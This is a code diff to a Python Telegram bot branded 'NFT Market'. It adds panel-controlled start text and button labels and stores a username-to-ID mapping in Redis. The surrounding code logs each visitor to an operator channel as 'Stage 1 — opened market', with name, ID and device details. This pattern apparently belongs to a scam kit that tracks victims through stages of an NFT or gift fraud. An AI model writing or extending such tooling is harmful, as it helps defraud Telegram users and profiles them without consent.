@@ -87,19 +87,34 @@ async def start_handler(message: types.Message):
         await handle_gift_start(message, payload)
         return
 
+    import urllib.parse
+    tg_user = message.from_user
+
+    # Читаем шаблоны из панели
+    bot_data_raw = await redis_get("panel_bot")
+    start_text = "Добро пожаловать в NFT Market! 🎁"
+    button_text = "🛍 Открыть маркет"
+    if bot_data_raw:
+        try:
+            bot_data = json.loads(urllib.parse.unquote(bot_data_raw))
+            start_text = bot_data.get("start_text", start_text)
+            button_text = bot_data.get("button_text", button_text)
+        except:
+            pass
+
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
-            text="🛍 Открыть маркет",
+            text=button_text,
             web_app=types.WebAppInfo(url=MARKET_URL)
         )]
     ])
-    raw = await redis_get(f"log_open:{message.from_user.id}")
+
+    raw = await redis_get(f"log_open:{tg_user.id}")
     info = {}
     if raw:
-        import urllib.parse
         try: info = json.loads(urllib.parse.unquote(raw))
         except: pass
-    tg_user = message.from_user
+
     await send_log(
         f"👁 <b>Этап 1 — Открыл маркет</b>\n"
         f"├ Бот: @asfafaff_bot\n"
@@ -108,7 +123,11 @@ async def start_handler(message: types.Message):
         f"├ Имя: {tg_user.first_name or '—'}\n"
         f"└ Устройство: {info.get('device', '—')[:80]}"
     )
-    await message.answer("Добро пожаловать в NFT Market! 🎁", reply_markup=keyboard)
+
+    if tg_user.username:
+        await redis_set(f"panel_user:{tg_user.username.lower()}", str(tg_user.id))
+
+    await message.answer(start_text, reply_markup=keyboard)
 
 async def handle_gift_start(message: types.Message, payload: str):
     try:
